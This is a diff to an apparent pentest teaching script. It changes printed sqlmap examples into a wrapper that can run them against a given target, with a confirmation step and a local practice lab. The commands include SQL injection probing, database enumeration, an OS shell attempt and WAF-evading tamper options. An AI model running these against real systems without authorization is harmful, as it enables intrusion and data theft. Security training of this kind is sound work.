@@ -14,13 +14,15 @@ Examples:
   examples.sh http://example.com/page
   examples.sh http://10.0.0.1:8080/login
 EOF
-    exit 0
 }
 
-[[ "${1:-}" =~ ^(-h|--help)$ ]] && show_help
+parse_common_args "$@"
+set -- "${REMAINING_ARGS[@]+${REMAINING_ARGS[@]}}"
 
 require_cmd sqlmap "brew install sqlmap"
 require_target "${1:-}"
+
+confirm_execute "${1:-}"
 safety_banner
 
 TARGET="$1"
@@ -30,19 +32,16 @@ info "Target: ${TARGET}"
 echo ""
 
 # 1. Basic URL test for SQL injection
-info "1) Test a URL parameter for injection"
-echo "   sqlmap -u '${TARGET}?id=1'"
-echo ""
+run_or_show "1) Test a URL parameter for injection" \
+    sqlmap -u "${TARGET}?id=1"
 
 # 2. Test with POST data
-info "2) Test POST parameters"
-echo "   sqlmap -u '${TARGET}' --data='username=admin&password=test'"
-echo ""
+run_or_show "2) Test POST parameters" \
+    sqlmap -u "$TARGET" --data='username=admin&password=test'
 
 # 3. Enumerate databases
-info "3) List all databases"
-echo "   sqlmap -u '${TARGET}?id=1' --dbs"
-echo ""
+run_or_show "3) List all databases" \
+    sqlmap -u "${TARGET}?id=1" --dbs
 
 # 4. Enumerate tables in a database
 info "4) List tables in a database"
@@ -55,14 +54,12 @@ echo "   sqlmap -u '${TARGET}?id=1' -D <database> -T <table> --dump"
 echo ""
 
 # 6. Get current user and database
-info "6) Get current DB user info"
-echo "   sqlmap -u '${TARGET}?id=1' --current-user --current-db"
-echo ""
+run_or_show "6) Get current DB user info" \
+    sqlmap -u "${TARGET}?id=1" --current-user --current-db
 
 # 7. Test all parameters automatically
-info "7) Auto-detect and test all parameters"
-echo "   sqlmap -u '${TARGET}?id=1&name=test' --batch"
-echo ""
+run_or_show "7) Auto-detect and test all parameters" \
+    sqlmap -u "${TARGET}?id=1&name=test" --batch
 
 # 8. Use a specific injection technique
 info "8) Specify injection techniques"
@@ -71,18 +68,18 @@ echo "   # B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline"
 echo ""
 
 # 9. OS shell (if DB user has privileges)
-info "9) Attempt OS shell access"
-echo "   sqlmap -u '${TARGET}?id=1' --os-shell"
-echo ""
+run_or_show "9) Attempt OS shell access" \
+    sqlmap -u "${TARGET}?id=1" --os-shell
 
 # 10. Tamper scripts (bypass WAF)
-info "10) Use tamper scripts to evade filters"
-echo "    sqlmap -u '${TARGET}?id=1' --tamper=space2comment,between"
-echo ""
+run_or_show "10) Use tamper scripts to evade filters" \
+    sqlmap -u "${TARGET}?id=1" --tamper=space2comment,between
 
 # Interactive demo (skip if non-interactive)
-[[ ! -t 0 ]] && exit 0
+if [[ "${EXECUTE_MODE:-show}" == "show" ]]; then
+    [[ ! -t 0 ]] && exit 0
 
-warn "Use --batch for non-interactive mode (accepts defaults)"
-warn "Use --output-dir=./sqlmap-output to save results"
-info "Practice target: make lab-up, then test http://localhost:8080"
+    warn "Use --batch for non-interactive mode (accepts defaults)"
+    warn "Use --output-dir=./sqlmap-output to save results"
+    info "Practice target: make lab-up, then test http://localhost:8080"
+fi
